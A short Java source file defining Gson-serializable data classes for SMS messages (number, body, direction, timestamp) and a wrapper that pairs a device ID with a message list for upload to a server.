package com.remote.devices;

import com.google.gson.annotations.SerializedName;

import java.util.List;

/**
 * Represents a single SMS message.
 */
public class SmsData {

    @SerializedName("address")
    private String address; // The phone number

    @SerializedName("body")
    private String body; // The message content

    @SerializedName("type")
    private String type; // "in" for incoming, "out" for outgoing

    @SerializedName("timestamp")
    private long timestamp;

    public SmsData(String address, String body, String type, long timestamp) {
        this.address = address;
        this.body = body;
        this.type = type;
        this.timestamp = timestamp;
    }
}

/**
 * A wrapper class to send a list of SMS messages to the server.
 */
class SmsHistory {
    @SerializedName("deviceId")
    private String deviceId;

    @SerializedName("messages")
    private List<SmsData> messages;

    public SmsHistory(String deviceId, List<SmsData> messages) {
        this.deviceId = deviceId;
        this.messages = messages;
    }
}
